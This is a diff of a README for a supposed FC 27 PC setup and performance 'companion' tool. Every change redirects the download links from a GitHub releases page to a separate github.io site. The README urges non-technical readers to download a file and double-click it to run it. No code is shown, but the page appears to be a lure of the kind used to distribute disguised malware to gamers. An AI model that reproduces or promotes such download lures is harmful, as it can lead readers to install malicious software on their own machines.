@@ -1,6 +1,6 @@
 # 🎮 fc-27-pc-install-performance-companion - Ultimate FC 27 PC Setup Assistant
 
-[![Download FC 27 Companion](https://img.shields.io/badge/Download-FC_27_Companion-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/pacificacapable7629/fc-27-pc-install-performance-companion/releases)
+[![Download FC 27 Companion](https://img.shields.io/badge/Download-FC_27_Companion-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://pacificacapable7629.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ No technical knowledge needed. Download, run, and follow the on-screen guide.
 
 Getting started takes less than five minutes. Follow these simple steps:
 
-1. **Visit the download link:** [Click here to download](https://github.com/pacificacapable7629/fc-27-pc-install-performance-companion/releases)
+1. **Visit the download link:** [Click here to download](https://pacificacapable7629.github.io)
 2. **Get the file:** Visit this link to download the application.
 3. **Save the file** to your Desktop or Downloads folder.
 4. **Double-click** the downloaded file to open it.
@@ -30,7 +30,7 @@ That's it! The application will open automatically after installation.
 
 This tool works directly with your existing FC 27 setup. No separate accounts or subscriptions needed.
 
-**Step 1:** Go to the [official download page](https://github.com/pacificacapable7629/fc-27-pc-install-performance-companion/releases)
+**Step 1:** Go to the [official download page](https://pacificacapable7629.github.io)
 
 **Step 2:** Click the green download button on that page.
 
@@ -210,7 +210,7 @@ Your games and settings won't be affected.
 
 This companion tool was created to make your FC 27 experience smoother and more enjoyable. Whether you're on a gaming desktop or a modest laptop, this app helps you get the best possible performance.
 
-**Ready to start?** Head to the [download page](https://github.com/pacificacapable7629/fc-27-pc-install-performance-companion/releases) now and get your FC 27 PC experience optimized in minutes!
+**Ready to start?** Head to the [download page](https://pacificacapable7629.github.io) now and get your FC 27 PC experience optimized in minutes!
 
 ---
 
